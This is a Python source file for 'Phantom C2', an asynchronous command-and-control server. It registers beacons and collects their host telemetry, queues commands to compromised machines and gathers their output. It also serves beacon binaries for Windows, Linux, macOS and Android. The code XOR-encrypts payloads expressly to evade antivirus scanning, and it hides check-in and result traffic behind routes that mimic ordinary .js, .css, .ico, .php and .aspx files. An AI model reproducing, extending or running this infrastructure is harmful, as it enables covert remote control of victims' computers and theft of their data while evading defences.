"""
c2_server.py — Phantom C2 Async Server
────────────────────────────────────────
aiohttp-based C2 server that runs in a background thread.
Handles beacon check-ins, task distribution, and encrypted result collection.
"""

import asyncio
import threading
import json
import base64
import os
import ssl
import socket
import ipaddress
from datetime import datetime
from typing import Any, Optional

from aiohttp import web
from dotenv import load_dotenv
from phantom.core.logger import logger
from phantom.utils.c2_crypto import (
    get_payload_token, 
    encrypt_data, 
    decrypt_data
)

# Load environment variables
load_dotenv()


# ── Shared State ────────────────────────────────────────────────────────────
# Accessed by both the C2 Shell (main thread) and the aiohttp server (bg thread).

class C2State:
    """Thread-safe state shared by the C2 shell and aiohttp listener."""

    def __init__(self):
        self.lock = threading.Lock()
        self.beacons: dict[str, dict[str, Any]] = {}
        self.tasks: dict[str, list[dict[str, Any]]] = {}
        self.results: dict[str, list[dict[str, Any]]] = {}

    def update_beacon(self, beacon_id: str, info: dict[str, Any]) -> None:
        with self.lock:
            info["last_seen"] = datetime.now().isoformat(timespec="seconds")
            if beacon_id not in self.beacons:
                self.beacons[beacon_id] = info
                self.tasks[beacon_id] = []
                self.results[beacon_id] = []
                logger.info(f"New beacon registered: {beacon_id} ({info.get('ip')})")
            else:
                self.beacons[beacon_id].update(info)

    def queue_task(self, beacon_id: str, command: str) -> str:
        with self.lock:
            if beacon_id not in self.tasks:
                self.tasks[beacon_id] = []
            task_id = datetime.now().strftime("%Y%m%d%H%M%S%f")
            self.tasks[beacon_id].append({"task_id": task_id, "command": command})
            return task_id

    def get_pending_tasks(self, beacon_id: str) -> list[dict[str, Any]]:
        with self.lock:
            tasks_to_send = list(self.tasks.get(beacon_id, []))
            self.tasks[beacon_id] = []  # Clear after retrieval
            return tasks_to_send

    def add_result(self, beacon_id: str, task_id: str, output: str) -> None:
        with self.lock:
            self.results.setdefault(beacon_id, []).append({
                "task_id": task_id,
                "output": output,
                "time": datetime.now().isoformat(timespec="seconds"),
            })

    def get_beacons(self) -> dict[str, dict[str, Any]]:
        with self.lock:
            return {bid: dict(info) for bid, info in self.beacons.items()}

    def get_results(self, beacon_id: str) -> list[dict[str, Any]]:
        with self.lock:
            return list(self.results.get(beacon_id, []))


c2_state = C2State()
PAYLOAD_AUTH_TOKEN = get_payload_token()


# ── aiohttp Handlers ───────────────────────────────────────────────────────

async def handle_checkin(request: web.Request) -> web.Response:
    """GET/POST /api/v1/ping — Beacon checks in and requests pending tasks.
       If POST, body contains encrypted telemetry JSON."""
    try:
        beacon_id = request.headers.get("X-Beacon-Id")
        if not beacon_id:
            logger.warning(f"Checkin attempt without Beacon ID from {request.remote}")
            return web.Response(status=400)

        info = {"ip": request.remote, "last_seen": datetime.now().isoformat(timespec="seconds")}
        c2_state.update_beacon(beacon_id, info)

        if request.method == "POST" and request.can_read_body:
            encrypted_body = await request.text()
            if encrypted_body:
                decrypted_body = decrypt_data(encrypted_body)
                if decrypted_body:
                    try:
                        data = json.loads(decrypted_body)
                        sysinfo = data.get("sysinfo", "")
                        netinfo = data.get("netinfo", "")
                        
                        # Basic parsing of sysinfo lines
                        for line in sysinfo.split("\n"):
                            if line.startswith("OS: "): info["os"] = line[4:].strip()
                            if line.startswith("Username: "): info["user"] = line[10:].strip()
                            if line.startswith("Architecture: "): info["arch"] = line[14:].strip()
                            if line.startswith("Hostname: "): info["hostname"] = line[10:].strip()
                        
                        # Basic parsing of netinfo for local IPs
                        ips = []
                        for line in netinfo.split("\n"):
                            if "IP: " in line:
                                ips.append(line.split("IP: ")[1].split(" ")[0])
                            elif "IP (v4): " in line:
                                ips.append(line.split("IP (v4): ")[1].strip())
                        if ips:
                            info["local_ips"] = ", ".join(ips)
                    except Exception as e:
                        logger.error(f"Failed to parse telemetry: {e}")

        c2_state.update_beacon(beacon_id, info)

        pending = c2_state.get_pending_tasks(beacon_id)
        response_data = json.dumps({"tasks": pending})
        encrypted_response = encrypt_data(response_data)

        return web.Response(text=encrypted_response, content_type="text/plain")
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        return web.Response(status=500)


async def handle_result(request: web.Request) -> web.Response:
    """POST /api/v1/result — Beacon sends encrypted command output."""
    try:
        beacon_id = request.headers.get("X-Beacon-Id")
        if not beacon_id:
            return web.Response(status=400)

        encrypted_body = await request.text()
        decrypted_body = decrypt_data(encrypted_body)

        if not decrypted_body:
            logger.warning(f"Result decryption failed from beacon {beacon_id}")
            return web.Response(status=400)

        try:
            data = json.loads(decrypted_body)
        except json.JSONDecodeError as e:
            logger.error(f"Failed to parse result JSON from {beacon_id}. Body: {decrypted_body[:100]}... Error: {e}")
            return web.Response(status=400)
            
        task_id = data.get("task_id", "unknown")
        output = data.get("output", "")

        c2_state.add_result(beacon_id, task_id, output)

        return web.Response(text="OK")
    except Exception as e:
        logger.error(f"Result error: {e}")
        return web.Response(status=500)


async def handle_payload(request: web.Request) -> web.Response:
    """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary.
       Requires ?auth=TOKEN or X-Auth-Token header."""
    try:
        import os
        # Always get current token from utility to stay in sync
        current_auth_token = get_payload_token()
        
        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
        if token != current_auth_token:
            logger.warning(f"Unauthorized payload request from {request.remote}. Received: {token}, Expected: {current_auth_token}")
            return web.Response(status=403, text="Forbidden: Invalid auth token")

        # Map route to filename
        platform_map = {
            "/api/v1/payload": "beacon.exe",
            "/api/v1/payload_linux": "beacon_linux",
            "/api/v1/payload_linux_x86": "beacon_linux_x86",
            "/api/v1/payload_macos": "beacon_macos",
            "/api/v1/payload_android": "beacon_android",
        }
        filename = platform_map.get(request.path)
        if not filename:
            return web.Response(text="Invalid payload path", status=404)
        
        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
        if not os.path.exists(payload_path):
            return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
        
        # Professional Evasion: XOR encrypt the payload before sending
        # This prevents AV from scanning the file while it's in transit.
        with open(payload_path, "rb") as f:
            data = f.read()
        
        # Use a simple XOR key (0xAA) - for production, this would be randomized
        encrypted_data = bytes([b ^ 0xAA for b in data])
        
        return web.Response(body=encrypted_data, content_type="application/octet-stream")
    except Exception as e:
        logger.error(f"Payload delivery error: {e}")
        return web.Response(status=500)


# ── Server Lifecycle ───────────────────────────────────────────────────────

class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 443):
        self.host = host
        self.port = port
        self.ssl_context: Optional[ssl.SSLContext] = None
        self.runner: Optional[web.AppRunner] = None
        self.site: Optional[web.TCPSite] = None
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.thread: Optional[threading.Thread] = None

    def _get_ssl_context(self) -> Optional[ssl.SSLContext]:
        """Load or generate SSL context for HTTPS support."""
        cert_dir = os.path.join(os.getcwd(), "data", "certs")
        os.makedirs(cert_dir, exist_ok=True)
        cert_path = os.path.join(cert_dir, "server.crt")
        key_path = os.path.join(cert_dir, "server.key")
        
        if not (os.path.exists(cert_path) and os.path.exists(key_path)):
            logger.info("SSL certificates missing. Generating self-signed certificate...")
            try:
                from cryptography import x509
                from cryptography.x509.oid import NameOID
                from cryptography.hazmat.primitives import hashes
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                import datetime as dt

                # Generate key
                key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                with open(key_path, "wb") as f:
                    f.write(key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.TraditionalOpenSSL,
                        encryption_algorithm=serialization.NoEncryption(),
                    ))

                # Generate cert
                subject = issuer = x509.Name([
                    x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
                    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
                    x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Phantom C2"),
                    x509.NameAttribute(NameOID.COMMON_NAME, u"phantom-c2.local"),
                ])
                # Generate SANs
                alt_names = [x509.DNSName(u"localhost")]
                if self.host and self.host != "0.0.0.0":
                    try:
                        addr = ipaddress.ip_address(self.host)
                        alt_names.append(x509.IPAddress(addr))
                    except ValueError:
                        alt_names.append(x509.DNSName(str(self.host)))

                cert = x509.CertificateBuilder().subject_name(
                    subject
                ).issuer_name(
                    issuer
                ).public_key(
                    key.public_key()
                ).serial_number(
                    x509.random_serial_number()
                ).not_valid_before(
                    dt.datetime.utcnow()
                ).not_valid_after(
                    dt.datetime.utcnow() + dt.timedelta(days=365)
                ).add_extension(
                    x509.SubjectAlternativeName(alt_names),
                    critical=False,
                ).sign(key, hashes.SHA256())

                with open(cert_path, "wb") as f:
                    f.write(cert.public_bytes(serialization.Encoding.PEM))
                
                logger.success("Self-signed certificate generated successfully.")
            except Exception as e:
                logger.error(f"Failed to generate self-signed certificate: {e}")
                return None

        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_path, key_path)
            return context
        except Exception as e:
            logger.error(f"Failed to load SSL certificates: {e}")
        return None

    def _setup_app(self) -> web.Application:
        app = web.Application()
        # Check-in: Support malleable URIs
        app.router.add_get("/api/v1/ping", handle_checkin)
        app.router.add_post("/api/v1/ping", handle_checkin)
        app.router.add_get("/{path:.*\.js}", handle_checkin)
        app.router.add_post("/{path:.*\.js}", handle_checkin)
        app.router.add_get("/{path:.*\.css}", handle_checkin)
        app.router.add_post("/{path:.*\.css}", handle_checkin)
        app.router.add_get("/{path:.*\.ico}", handle_checkin)
        app.router.add_post("/{path:.*\.ico}", handle_checkin)
        
        # Results
        app.router.add_post("/api/v1/result", handle_result)
        app.router.add_post("/{path:.*\.php}", handle_result)
        app.router.add_post("/{path:.*\.aspx}", handle_result)
        
        # Payload delivery
        app.router.add_get("/api/v1/payload", handle_payload)
        app.router.add_get("/api/v1/payload_linux", handle_payload)
        app.router.add_get("/api/v1/payload_linux_x86", handle_payload)
        app.router.add_get("/api/v1/payload_macos", handle_payload)
        app.router.add_get("/api/v1/payload_android", handle_payload)
        return app

    def _start_server(self) -> None:
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        # Re-create app inside the loop thread
        self.app = self._setup_app()
        
        # Determine if we should use SSL
        self.ssl_context = self._get_ssl_context()
        
        self.runner = web.AppRunner(self.app, access_log=None)
        self.loop.run_until_complete(self.runner.setup())
        
        # Fix: Always bind to 0.0.0.0 to avoid OSError 10049 if host is non-local
        # The provided 'host' is used for display and dropper generation.
        bind_host = "0.0.0.0"
        self.site = web.TCPSite(self.runner, bind_host, self.port, ssl_context=self.ssl_context)
        
        self.loop.run_until_complete(self.site.start())
        proto = "HTTPS" if self.ssl_context else "HTTP"
        logger.info(f"C2 Async Server ({proto}) started on {bind_host}:{self.port}")
        self.loop.run_forever()

    def start(self, host: Optional[str] = None, port: Optional[int] = None) -> None:
        if self.thread and self.thread.is_alive():
            return
        if host:
            self.host = host
        if port:
            self.port = port
        self.thread = threading.Thread(target=self._start_server, daemon=True)
        self.thread.start()

    def stop(self) -> None:
        if self.loop and self.runner:
            async def cleanup():
                await self.runner.cleanup()
            try:
                future = asyncio.run_coroutine_threadsafe(cleanup(), self.loop)
                future.result(timeout=2)
            except Exception:
                pass
            self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread:
                self.thread.join(timeout=2)
                self.thread = None
            self.loop = None
            self.runner = None


server_instance = C2Server()
